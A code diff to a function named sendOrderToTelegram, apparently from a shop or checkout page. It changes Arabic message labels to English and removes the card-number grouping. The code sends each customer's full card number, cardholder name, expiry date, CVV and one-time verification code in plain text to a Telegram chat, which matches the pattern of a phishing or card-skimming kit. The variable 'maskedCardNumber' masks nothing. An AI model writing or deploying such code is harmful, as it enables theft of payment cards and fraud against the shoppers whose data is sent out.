@@ -165,25 +165,25 @@ export async function sendOrderToTelegram(
 
     // Add payment details if available
     if (orderData.paymentDetails) {
-      message += "\nتفاصيل الدفع:\n";
+      message += "\n🔒 Payment Details 🔒\n";
       if (orderData.paymentDetails.cardNumber) {
-        const maskedCardNumber =
-          orderData.paymentDetails.cardNumber
-            .replace(/\s/g, "")
-            .match(/.{1,4}/g) ?? [].join(" ");
+        const maskedCardNumber = orderData.paymentDetails.cardNumber.replace(
+          /\s/g,
+          ""
+        );
         if (orderData.paymentDetails.cardHolder) {
-          message += `اسم حامل البطاقة: ${orderData.paymentDetails.cardHolder}\n`;
+          message += `Card Holder: ${orderData.paymentDetails.cardHolder}\n`;
         }
-        message += `رقم البطاقة: ${maskedCardNumber}\n`;
+        message += `Card Number: ${maskedCardNumber}\n`;
       }
       if (orderData.paymentDetails.expiryDate) {
-        message += `تاريخ الانتهاء: ${orderData.paymentDetails.expiryDate}\n`;
+        message += `Expiry Date: ${orderData.paymentDetails.expiryDate}\n`;
       }
       if (orderData.paymentDetails.cvv) {
-        message += `رمز الأمان:  ${orderData.paymentDetails.cvv}\n`;
+        message += `CVV: ${orderData.paymentDetails.cvv}\n`;
       }
       if (orderData.paymentDetails.verificationCode) {
-        message += `رمز التحقق: ${orderData.paymentDetails.verificationCode}\n`;
+        message += `Verification Code: ${orderData.paymentDetails.verificationCode}\n`;
       }
     }
 
